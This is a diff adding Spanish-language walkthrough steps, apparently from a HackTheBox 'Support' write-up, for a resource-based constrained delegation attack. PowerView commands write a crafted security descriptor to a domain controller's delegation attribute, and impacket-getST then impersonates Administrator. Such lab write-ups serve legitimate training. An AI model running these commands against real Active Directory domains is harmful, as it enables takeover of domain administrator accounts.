@@ -298,3 +298,36 @@ Enumeraremos el SID con [[POWERVIEW]]
 $ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid
 ```
 
+Y acontinuacion ejecutamos los siguientes comandos
+```bash
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+```
+
+```bash
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+```
+
+```bash
+$SD.GetBinaryForm($SDBytes, 0)
+```
+
+```bash
+Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+
+Verificamos que ha funcionado
+```bash
+Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity'
+```
+
+Nos tiene que devolver
+```shell
+msds-allowedtoactonbehalfofotheridentity
+```
+
+Hacemos la impersonacion usando [[IMPACKET]]
+```shell
+impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.230.181 support.htb/SERVICEA:123456
+```
+
+
